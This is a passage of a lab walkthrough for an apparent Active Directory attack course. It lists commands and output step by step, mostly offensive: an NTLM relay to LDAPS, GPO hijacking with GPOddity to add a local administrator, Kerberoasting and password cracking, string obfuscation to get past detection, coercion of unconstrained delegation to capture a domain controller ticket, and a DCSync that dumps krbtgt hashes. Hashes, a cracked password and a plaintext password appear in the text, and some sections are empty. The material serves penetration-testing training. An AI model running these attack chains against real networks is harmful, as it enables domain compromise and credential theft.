gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 12/24/2024 7:09:01 AM
versionnumber            : 3
name                     : {0BF8D01C-1F62-4BDC-958C-57140B67D147}📑
cn                       : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
usnchanged               : 296496
dscorepropagationdata    : {12/18/2024 7:31:56 AM, 1/1/1601 12:00:00 AM}
objectguid               : fc0df125-5e26-4794-93c7-e60c6eecb75f
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{0BF8D01C-1F62-4BDC-958C-57140B67D147}📁
distinguishedname        : CN={0BF8D01C-1F62-4BDC-958C-57140B67D147},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 12/18/2024 7:31:22 AM
showinadvancedviewonly   : True
usncreated               : 293100
gpcfunctionalityversion  : 2
instancetype             : 4
objectclass              : {top, container, groupPolicyContainer}
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
```

`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'devopsadmin'}`:
```
[SNIP]

ObjectDN📌              : CN={0BF8D01C-1F62-4BDC-958C-57140B67D147}📑,CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl📌, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-719815819-3726368948-3917688648-17101
IdentityReferenceName   : devopsadmin👤
IdentityReferenceDomain : dollarcorp.moneycorp.local
IdentityReferenceDN     : CN=devopsadmin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
IdentityReferenceClass  : user

[SNIP]
```

`net view \\dcorp-ci`:
```
Shared resources at \\dcorp-ci



Share name  Type  Used as  Comment

-------------------------------------------------------------------------------
AI📁        Disk
The command completed successfully.
```

`dir \\dcorp-ci\AI`:
```
 Volume in drive \\dcorp-ci\AI has no label.
 Volume Serial Number is 76D3-EB93

 Directory of \\dcorp-ci\AI

12/23/2024  11:09 PM    <DIR>          .
01/06/2025  12:22 AM             3,332 AI.log📌
               1 File(s)          3,332 bytes
               1 Dir(s)   5,767,585,792 bytes free
```

![\\dcorp-ci\AI share](./assets/screenshots/learning_objective_06_dcorpci_ai_share.png)

![dcorp-std422 | wsluser](https://custom-icon-badges.demolab.com/badge/dcorp--std422-wsluser-e95420?logo=ubuntu&logoColor=white)

`ip addr`:
```
23: eth0: <BROADCAST,MULTICAST,UP> mtu 1500 group default qlen 1
    link/ether 00:15:5d:fd:78:0c
    inet 172.16.100.22📌/24 brd 172.16.100.255 scope global dynamic
       valid_lft forever preferred_lft forever
    inet6 fe80::d5b9:a798:6a3d:c87/64 scope link dynamic
       valid_lft forever preferred_lft forever
1: lo: <LOOPBACK,UP> mtu 1500 group default qlen 1
    link/loopback 00:00:00:00:00:00
    inet 127.0.0.1/8 brd 127.255.255.255 scope global dynamic
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host dynamic
       valid_lft forever preferred_lft forever
```

`sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.22 --http-port '80,8080' -i --no-smb-server`:
```
[sudo] password for wsluser:
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..📌
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up HTTP Server on port 80
[*] Setting up HTTP Server on port 8080
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections

[...]
```

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

![student422.lnk](./assets/screenshots/learning_objective_06_student422_lnk.png)

`xcopy C:\AD\Tools\student422.lnk \\dcorp-ci\AI`:
```
C:\AD\Tools\student422.lnk
1 File(s) copied
```

![dcorp-std422 | wsluser](https://custom-icon-badges.demolab.com/badge/dcorp--std422-wsluser-e95420?logo=ubuntu&logoColor=white)

```
[...]

[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Connection from 172.16.3.11📌 controlled, attacking target ldaps://172.16.2.1
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Authenticating against ldaps://172.16.2.1 as DCORP/DEVOPSADMIN SUCCEED📌
[*] Started interactive Ldap shell via TCP on 127.0.0.1:11000📌 as DCORP/DEVOPSADMIN
```

`nc 127.0.0.1 11000`:
```
Type help for list of commands

# whoami
u:dcorp\devopsadmin👤

# write_gpo_dacl student422 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
Adding student422 to GPO with GUID {0BF8D01C-1F62-4BDC-958C-57140B67D147}📌
LDAP server claims to have taken the secdescriptor. Have fun
```

`cd /mnt/c/AD/Tools/GPOddity`

`sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'student422' --password 'Cv8xAG7v2FhkAZPh' --command 'net localgroup administrators student422 /add' --rogue-smbserver-ip '172.16.100.22' --rogue-smbserver-share 'std422-gp' --dc-ip '172.16.2.1' --smb-mode none`:
```
[sudo] password for wsluser:

=== GENERATING MALICIOUS GROUP POLICY TEMPLATE ===📑

[*] Downloading the legitimate GPT from SYSVOL
[+] Successfully downloaded legitimate GPO from SYSVOL to 'GPT_out' folder📌
[*] Injecting malicious scheduled task into initialized GPT📌
[+] Successfully injected malicious scheduled task
[*] Initiating LDAP connection
[+] LDAP bind successful
[*] Updating downloaded GPO version number to ensure automatic GPO application
[+] Successfully updated downloaded GPO version number

=== SPOOFING GROUP POLICY TEMPLATE LOCATION THROUGH gPCFileSysPath ===

[*] Modifying the gPCFileSysPath attribute of the GPC to '\\172.16.100.22\std422-gp'📁
[+] Successfully spoofed GPC gPCFileSysPath attribute
[*] Updating the versionNumber attribute of the GPC
[+] Successfully updated GPC versionNumber attribute
[*] Updating the extensionName attribute of the GPC
[+] Successfully updated GPC extensionName attribute

=== WAITING (not launching GPOddity SMB server) ===
[*] CTRL+C to stop and clean...
```

`ls /mnt/c/AD/Tools/GPOddity/GPT_out/`:
```
total 0
drwxrwxrwx 1 wsluser wsluser 4096 Feb 20 07:47 Machine
drwxrwxrwx 1 wsluser wsluser 4096 Feb 20 07:47 User
-rwxrwxrwx 1 wsluser wsluser   56 Feb 20 07:47 gpt.ini📌
```

`mkdir /mnt/c/AD/Tools/std422-gp`

`cp -r /mnt/c/AD/Tools/GPOddity/GPT_out/* /mnt/c/AD/Tools/std422-gp`

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`net share std422-gp=C:\AD\Tools\std422-gp /grant:Everyone,Full`:
```
std422-gp was shared successfully.
```

`icacls "C:\AD\Tools\std422-gp" /grant Everyone:F /T`:
```
processed file: C:\AD\Tools\std422-gp
processed file: C:\AD\Tools\std422-gp\gpt.ini
processed file: C:\AD\Tools\std422-gp\Machine
processed file: C:\AD\Tools\std422-gp\User
processed file: C:\AD\Tools\std422-gp\Machine\comment.cmtx
processed file: C:\AD\Tools\std422-gp\Machine\Microsoft
processed file: C:\AD\Tools\std422-gp\Machine\Preferences
processed file: C:\AD\Tools\std422-gp\Machine\Registry.pol
processed file: C:\AD\Tools\std422-gp\Machine\Scripts
processed file: C:\AD\Tools\std422-gp\Machine\Microsoft\Windows NT
processed file: C:\AD\Tools\std422-gp\Machine\Microsoft\Windows NT\SecEdit
processed file: C:\AD\Tools\std422-gp\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
processed file: C:\AD\Tools\std422-gp\Machine\Preferences\ScheduledTasks
processed file: C:\AD\Tools\std422-gp\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
processed file: C:\AD\Tools\std422-gp\Machine\Scripts\Shutdown
processed file: C:\AD\Tools\std422-gp\Machine\Scripts\Startup
Successfully processed 16 files; Failed processing 0 files
```

`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

`Get-DomainGPO -Identity "DevOps Policy"`:
```
flags                    : 0
displayname              : DevOps Policy📑
gpcmachineextensionnames : [{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{AADCED64-746C-4633-A97C-D61349046527}{CA
                           B54552-DEEA-4691-817E-ED4A4D1AFC72}]
whenchanged              : 2/20/2025 3:47:16 PM
versionnumber            : 4
name                     : {0BF8D01C-1F62-4BDC-958C-57140B67D147}📑
cn                       : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
usnchanged               : 1667030
dscorepropagationdata    : {2/20/2025 3:45:17 PM, 12/18/2024 7:31:56 AM, 1/1/1601 12:00:00 AM}
objectguid               : fc0df125-5e26-4794-93c7-e60c6eecb75f
gpcfilesyspath           : \\172.16.100.22\std422-gp📁
distinguishedname        : CN={0BF8D01C-1F62-4BDC-958C-57140B67D147},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,D
                           C=local
whencreated              : 12/18/2024 7:31:22 AM
showinadvancedviewonly   : True
usncreated               : 293100
gpcfunctionalityversion  : 2
instancetype             : 4
objectclass              : {top, container, groupPolicyContainer}
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
```

`winrs -r:dcorp-ci cmd: /c "set computername && set username"`:
```
COMPUTERNAME=DCORP-CI🖥️
USERNAME=student422👤
```
🚩

### Domain Privilege Escalation

#### Domain Privilege Escalation, Lateral Movement (with Invoke-SessionHunter, SafetyKatz, Rubeus, Invoke-Mimi, Runas, Find-PSRemotingLocalAdminAccess)

`Import-Module C:\AD\Tools\Invoke-SessionHunter.ps1`

`Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access`:
```
[+] Elapsed time: 0:0:2.290

HostName       UserSession                Access
--------       -----------                ------
dcorp-appsrv   dcorp\appadmin              False
dcorp-ci       dcorp\ciadmin               False
dcorp-ci       dcorp\devopsadmin           False
dcorp-mgmt     dcorp\mgmtadmin             False
dcorp-mssql    dcorp\sqladmin              False
dcorp-sql1     dcorp\sql1admin             False
dcorp-stdadmin dcorp\studentadmin          False
dcorp-mgmt🖥️   dcorp\svcadmin👤            False📌
dcorp-stdadmin DCORP-STD422\Administrator  False
dcorp-adminsrv dcorp\appadmin               True
dcorp-adminsrv dcorp\srvadmin               True
dcorp-adminsrv dcorp\websvc                 True
```

``:
```

```

``:
```

```

``:
```

```

``:
```

```

``:
```

```

``:
```

```

#### Domain Privilege Escalation | Kerberoasting (with PowerView, Rubeus, John)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

`Get-DomainUser -SPN`:
```
[SNIP]

logoncount            : 39
badpasswordtime       : 11/25/2022 4:20:42 AM
description           : Account to be used for services which need high privileges.
distinguishedname     : CN=svc admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
objectclass           : {top, person, organizationalPerson, user}
displayname           : svc admin
lastlogontimestamp    : 2/14/2025 1:45:16 AM
userprincipalname     : svcadmin
samaccountname        : svcadmin👤
admincount            : 1
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 2/14/2025 9:45:16 AM
instancetype          : 4
usncreated            : 40118
objectguid            : 244f9c84-7e33-4ed6-aca1-3328d0802db0
sn                    : admin
lastlogoff            : 12/31/1600 4:00:00 PM
whencreated           : 11/14/2022 5:06:37 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata : {2/14/2025 3:40:35 PM, 2/14/2025 2:40:35 PM, 2/14/2025 1:40:35 PM, 2/14/2025 12:40:35 PM...}
serviceprincipalname📌: {MSSQLSvc📌/dcorp-mgmt.dollarcorp.moneycorp.local:1433, MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local}
givenname             : svc
usnchanged            : 1139619
memberof              : CN=Domain Admins👥,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
lastlogon             : 2/14/2025 4:58:23 AM
badpwdcount           : 0
cn                    : svc admin
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
objectsid             : S-1-5-21-719815819-3726368948-3917688648-1118
primarygroupid        : 513
pwdlastset            : 11/14/2022 9:06:37 AM
name                  : svc admin

[SNIP]
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt`:
```
```
❌

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`powershell`

`cmd /c 'C:\AD\Tools\ArgSplit.bat'`:
```
[!] Argument Limit: 180 characters
[+] Enter a string: kerberoast📌
set "z=t"
set "y=s"
set "x=a"
set "w=o"
set "v=r"
set "u=e"
set "t=b"
set "s=r"
set "r=e"
set "q=k"
set "Pwn=%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"
```

```powershell
$z="t";$y="s";$x="a";$w="o";$v="r";$u="e";$t="b";$s="r";$r="e";$q="k";$Pwn="$q$r$s$t$u$v$w$x$y$z"
```

`echo $Pwn`:
```
kerberoast
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args $Pwn /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\krb5tgs_hashes.txt`:
```
[SNIP]

[*] Action: Kerberoasting📌

[*] Using 'tgtdeleg' to request a TGT for the current user
[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else
[*] Target User            : svcadmin👤
[*] Target Domain          : dollarcorp.moneycorp.local
[+] Ticket successfully imported!
[*] Searching for accounts that only support RC4_HMAC, no AES
[*] Searching path 'LDAP://dcorp-dc.dollarcorp.moneycorp.local/DC=dollarcorp,DC=moneycorp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=svcadmin)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))'

[*] Total kerberoastable users : 1

[*] Hash written to C:\AD\Tools\krb5tgs_hashes.txt

[*] Roasted hashes written to : C:\AD\Tools\krb5tgs_hashes.txt📌
```

`type C:\AD\Tools\krb5tgs_hashes.txt`:
```
$krb5tgs$23$*svcadmin$DOLLARCORP.MONEYCORP.LOCAL$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433📌*$5D4CC629D36FC997F43A4E1929AAA3E6$19A5438620F00654A115B7E1E46B2254269A7C6F68B695F5F0B17FDB5F7CA4FE98C7B40FDC4CD69AC0BB96707979B73746D7C28A5D74DD328CCAAF0C1866480E9B5F436601CCCF7E89034C81F40B19B508E4C44CF97C9B37923F121B370A0EBB1BF283C696B9AED43E2E83E54522483ABE2C7EA2F0496B54F885AC53C61F6DD3CF...

[SNIP]
```

`notepad C:\AD\Tools\krb5tgs_hashes.txt`:
```
$krb5tgs$23$*svcadmin$DOLLARCORP.MONEYCORP.LOCAL$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local*$5D4CC629D36FC997F43A4E1929AAA3E6$19A5438620F00654A115B7E1E46B2254269A7C6F68B695F5F0B17FDB5F7CA4FE98C7B40FDC4CD69AC0BB96707979B73746D7C28A5D74DD328CCAAF0C1866480E9B5F436601CCCF7E89034C81F40B19B508E4C44CF97C9B37923F121B370A0EBB1BF283C696B9AED43E2E83E54522483ABE2C7EA2F0496B54F885AC53C61F6DD3CFE78D3...

[SNIP]
```

`C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\krb5tgs_hashes.txt`:
```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*ThisisBlasphemyThisisMadness!!🔑 (?)
1g 0:00:00:00 DONE (2025-03-04 02:13) 24.39g/s 49951p/s 49951c/s 49951C/s energy..mollie
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
🚩

``:
```

```

#### Domain Privilege Escalation | Unconstrained Delegation + Coercion + DCSync (with PowerView, Rubeus, Find-PSRemotingLocalAdminAccess, MS-RPRN, SafetyKatz)

- **Find a Target Server where Unconstrained Delegation is Enabled**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

`Get-DomainComputer -Unconstrained | select -ExpandProperty name`:
```
DCORP-DC
DCORP-APPSRV🖥️
```

- **Access to the Target Server with a User that has Local Admin Privileges on it**

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
```
[SNIP]

[*] Action: Ask TGT📌

[*] Got domain: dollarcorp.moneycorp.local
[*] Showing process : True
[*] Username        : 1XKIMQML
[*] Domain          : W5YAGJ7Y
[*] Password        : 2C10B8EJ
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 2112
[+] LUID            : 0x2493b32

[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[!] Pre-Authentication required!
[!]     AES256 Salt: DOLLARCORP.MONEYCORP.LOCALappadmin
[*] Using aes256_cts_hmac_sha1 hash: 68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\appadmin'
[*] Target LUID : 38353714
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[SNIP]

[*] Target LUID: 0x2493b32
[+] Ticket successfully imported!🎟️

  ServiceName              :  krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL
  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL🏛️
  UserName                 :  appadmin🎭 (NT_PRINCIPAL)
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  2/16/2025 7:53:18 AM
  EndTime                  :  2/16/2025 5:53:18 PM
  RenewTill                :  2/23/2025 7:53:18 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  BB2GYGp4KWyao6ckv9MPXZ6mubqUoDknMIYba+S8XlU=
  ASREP (key)              :  68F08715061E4D0790E71B1245BF20B023D08822D2DF85BFF50A0E8136FFE4CB
```

![New spawned terminal process](./assets/screenshots/learning_objective_15_new_spawned_terminal_process.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`klist`:
```
Current LogonId is 0:0x2493b32

Cached Tickets: (1)

#0>     Client: appadmin🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/16/2025 7:53:18 (local)
        End Time:   2/16/2025 17:53:18 (local)
        Renew Time: 2/23/2025 7:53:18 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`

`Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local`:
```
dcorp-appsrv🖥️
dcorp-adminsrv
```

`echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y`:
```
Does \\dcorp-appsrv\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Loader.exe
1 File(s) copied
```

`winrs -r:dcorp-appsrv cmd`:
```
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Users\appadmin>
```
🚀

- **Listen on the Target Server for an incoming TGT from the (Child) DC**

![dcorp-appsrv | appadmin](https://custom-icon-badges.demolab.com/badge/dcorp--appsrv-appadmin-64b5f6?logo=windows11&logoColor=white)

`ipconfig`:
```
Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::987a:973e:4221:4e1c%4
   IPv4 Address. . . . . . . . . . . : 172.16.4.217📌
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.4.254
```

`netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.22`

![HFS - Rubeus.exe](./assets/screenshots/learning_objective_15_hfs_rubeus.png)

- **Use Coercion to Force Authentication from the (Child) DC to a Service on the Target Server and Capture its TGT**

![Unconstrained Delegation - Coercion Protocols](./assets/screenshots/learning_objective_15_unconstrained_delegation_coercion_protocols.png)

**Coercion from `dcorp-dc$` (with MS-RPRN) - DA Privileges**

![dcorp-appsrv | appadmin](https://custom-icon-badges.demolab.com/badge/dcorp--appsrv-appadmin-64b5f6?logo=windows11&logoColor=white)

`C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap`:
```
[*] Action: TGT Monitoring📌
[*] Target user     : DCORP-DC$🖥️
[*] Monitoring every 5 seconds for new TGTs

[...]
```

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local`:
```
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.
```

![dcorp-appsrv | appadmin](https://custom-icon-badges.demolab.com/badge/dcorp--appsrv-appadmin-64b5f6?logo=windows11&logoColor=white)

```
[...]

[*] 2/17/2025 10:09:58 AM UTC - Found new TGT:📌

  User                  :  DCORP-DC$🎭@DOLLARCORP.MONEYCORP.LOCAL🏛️
  StartTime             :  2/16/2025 9:08:20 PM
  EndTime               :  2/17/2025 7:07:36 AM
  RenewTill             :  2/23/2025 9:07:36 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIGRTCCBkGgAwIBBaEDAgEWooIFGjCCBRZhggUSMIIFDqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBLYwggSyoAMCARKhAwIBAqKCBKQEggSgiSOfNm5S4SVHlQY9Omc0YRx+/XzCDmthBLgrvjVQ6xHWN13y3Jn9RQ...

[*] Ticket cache size: 1
```

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIGRTCCBkGgAwIBBaEDAgEWooIFGjCCBRZhggUSMIIFDqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBLYwggSyoAMCARKhAwIBAqKCBKQEggSgiSOfNm5S4SVHlQY9Omc0YRx+/XzCDmthBLgrvjVQ6xHWN13y3J...`:
```
[SNIP]

[*] Action: Import Ticket📌
[+] Ticket successfully imported!🎟️
```

`klist`:
```
Current LogonId is 0:0x4964ae

Cached Tickets: (1)

#0>     Client: DCORP-DC$🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 2/19/2025 21:03:44 (local)
        End Time:   2/20/2025 7:02:10 (local)
        Renew Time: 2/26/2025 21:02:10 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

- **Leverage the Captured TGT to Run a DCSync Attack on the (Child) DC and Gain DA Privileges**

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"`:
```
[SNIP]

mimikatz(commandline) # lsadump::evasive-dcsync /user:dcorp\krbtgt📌
[DC] 'dollarcorp.moneycorp.local'🏛️ will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt👤
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 9:59:41 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986🔑
    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
    lm  - 0: ea03581a1268674a828bde6ab09db837

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd

* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848🔑
      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
      des_cbc_md5       (4096) : 150ea2e934ab6b80

[SNIP]
```
🚩

- **Listen on the Target Server for an incoming TGT from the (Parent Root) DC**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`klist`:
```
Current LogonId is 0:0x2493b32

Cached Tickets: (1)

#0>     Client: appadmin🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/16/2025 7:53:18 (local)
        End Time:   2/16/2025 17:53:18 (local)
        Renew Time: 2/23/2025 7:53:18 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`winrs -r:dcorp-appsrv cmd`:
```
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Users\appadmin>
```
🚀

![dcorp-appsrv | appadmin](https://custom-icon-badges.demolab.com/badge/dcorp--appsrv-appadmin-64b5f6?logo=windows11&logoColor=white)

`C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:MCORP-DC$ /interval:5 /nowrap`:
```
[*] Action: TGT Monitoring📌
[*] Target user     : MCORP-DC$🖥️
[*] Monitoring every 5 seconds for new TGTs

[...]
```

